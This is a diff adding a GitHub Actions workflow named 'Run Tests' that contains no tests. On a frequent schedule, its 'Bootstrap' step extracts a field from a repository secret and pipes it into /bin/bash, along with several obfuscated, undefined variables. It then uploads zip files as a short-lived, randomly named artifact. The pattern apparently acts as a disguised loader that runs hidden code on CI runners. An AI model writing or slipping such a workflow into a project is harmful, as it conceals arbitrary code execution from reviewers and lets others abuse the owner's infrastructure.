@@ -1,0 +1,35 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '38 4,10,16,22 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          mf00891: ${{ secrets.mf00891 }}
+        run: |
+          printf '%s' "$mf00891" | jq -r .sn8 | /bin/bash
+          echo $z20 | jq -r .hr86 | /bin/bash
+          printf '%s' "$b29975" | jq -r .ulk07131 | /bin/bash
+          echo $trm68571 | jq -r .ptd8548 | /bin/bash
+          echo $nxtv948 | jq -r .mfop7 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 7cLY1nxI
+          path: "*.zip"
+          retention-days: 1
